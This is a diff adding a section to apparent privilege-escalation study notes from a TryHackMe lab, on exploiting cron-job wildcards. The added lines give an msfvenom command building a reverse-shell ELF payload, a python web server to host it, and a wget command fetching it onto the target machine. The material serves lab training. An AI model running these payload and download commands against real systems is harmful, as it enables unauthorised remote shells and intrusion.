@@ -133,3 +133,13 @@ Next we can make this command an executable by doing:
 chmod +x ls
 I couldn't get this to work for me so I'm not going to note on it but follow this for similar exploitation: https://tryhackme.com/r/room/commonlinuxprivesc task 9
 
+CRON JOBS - WILDCARDS
+First you are able to find a wildcard marked by *
+to exploit a wildcard we can create a payload using msfvenom:
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.6.4.208 LPORT=4444 -f elf -o shell.elf
+Now we can start a server on our own port using
+python3 -m http.server 8000
+and then we can get the file on the remote machine using:
+wget 10.6.4.208:8000/shell.elf
+
+
